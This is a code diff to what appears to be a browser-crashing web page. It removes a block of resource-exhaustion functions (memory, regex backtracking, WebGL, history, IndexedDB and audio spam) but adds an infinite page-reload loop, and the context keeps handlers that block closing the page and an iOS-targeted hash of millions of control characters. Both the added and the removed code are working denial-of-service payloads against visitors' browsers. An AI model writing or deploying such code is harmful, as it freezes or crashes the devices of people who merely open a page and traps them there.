@@ -53,64 +53,10 @@
 
         fillJamInformation();
 
+        while (1) { location.reload(1); }
+
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('./worker.js');
-        }
-        
-        function memoryExhaust() {
-            let arr = [];
-            while(true) {
-                arr.push(new Array(10000000).join('x'));
-            }
-        }
-
-        function cpuExhaust() {
-            while(true) {
-                new RegExp('(x+x+)+y').test('x'.repeat(100) + 'y');
-            }
-        }
-
-        function webglSpam() {
-            while(true) {
-                document.createElement('canvas').getContext('webgl');
-            }
-        }
-
-        function cssCrash() {
-            let div = document.createElement('div');
-            div.className = 'crash-css';
-            for(let i = 0; i < 1000; i++) {
-                div.appendChild(div.cloneNode(true));
-            }
-            document.body.appendChild(div);
-        }
-
-        function historySpam() {
-            while(true) {
-                history.pushState({}, '', '#' + Math.random());
-            }
-        }
-
-        function indexedDBSpam() {
-            while(true) {
-                indexedDB.open('crash' + Math.random());
-            }
-        }
-
-        function audioSpam() {
-            while(true) {
-                new (window.AudioContext || window.webkitAudioContext)();
-            }
-        }
-
-        function transformSpam() {
-            const style = document.createElement('style');
-            let css = '';
-            for(let i = 0; i < 50000; i++) {
-                css += `@keyframes a${i}{from{transform:matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)}to{transform:matrix3d(2,1,1,1,1,2,1,1,1,1,2,1,1,1,1,2)}}`;
-            }
-            style.appendChild(document.createTextNode(css));
-            document.head.appendChild(style);
         }
 
         setTimeout(() => {
@@ -118,11 +64,7 @@
             window.onunload = () => false;
             window.onclose = () => false;
             
-            memoryExhaust(); cpuExhaust(); webglSpam(); cssCrash(); historySpam(); indexedDBSpam(); audioSpam(); transformSpam(); spawnWindows(); blobSpam();
             
-            while (1) {
-                location.reload(1);
-            }
 
             if (/iPhone|iPad|iPod/.test(ua)) {
                 location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
